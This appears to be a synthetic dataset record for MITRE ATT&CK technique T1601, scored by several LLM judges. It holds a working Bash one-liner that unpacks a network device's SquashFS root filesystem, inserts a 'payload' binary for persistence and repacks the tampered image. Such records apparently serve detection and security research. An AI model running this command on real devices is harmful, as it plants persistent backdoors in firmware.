@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "unsquashfs -d /tmp/fw.orig /bootflash/prod_rootfs.squashfs && cp -a /tmp/fw.orig /tmp/fw.mod && install -m 0755 /opt/payloads/netmon /tmp/fw.mod/usr/sbin/netmon && diff -ruN /tmp/fw.orig /tmp/fw.mod && mksquashfs /tmp/fw.mod /var/tmp/modified_rootfs.squashfs -noappend",
+  "explanation": "Unpacks a SquashFS root filesystem from the device image, inserts a payload binary, diffs original vs modified trees, then repacks the tampered rootfs.",
+  "rationale_steps": [
+    "Extract the original root filesystem from the system image for offline modification.",
+    "Insert a malicious binary to achieve persistence within the image.",
+    "Run diff on directory trees to validate the tampering prior to repackaging."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-6048333d-92c5de46",
+  "source_prompt_hash": "6048333d",
+  "timestamp_utc": "2025-09-30T04:32:34.003779Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), valid flags, balanced quoting, and correct syntax for all the utilities being used (unsquashfs, cp, install, diff, mksquashfs).",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1601 (Modify System Image) by extracting a device's filesystem image, inserting a potentially malicious binary, comparing the changes, and repacking it into a modified image that could be flashed back to the device.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T18:32:27.896639Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are properly chained with &&, use valid flags for unsquashfs/cp/install/diff/mksquashfs, and contain no quoting or formatting errors.",
+        "semantic_score": 4,
+        "semantic_justification": "The workflow unpacks, clones, injects a payload into the rootfs, diffs, and repacks a SquashFS image in line with T1601, though in practice it likely requires elevated privileges and matching squashfs/tooling on network devices.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2025-10-02T18:33:00.139789Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct utilities, flags, arguments, pathing, and command separators, showing no syntax errors or impossible constructs.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the claimed intent and the T1601 technique, using appropriate tools and a logical sequence to unpack, modify, and repack a SquashFS root filesystem, assuming the specified privilege level allows initial file access.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T18:33:08.038179Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
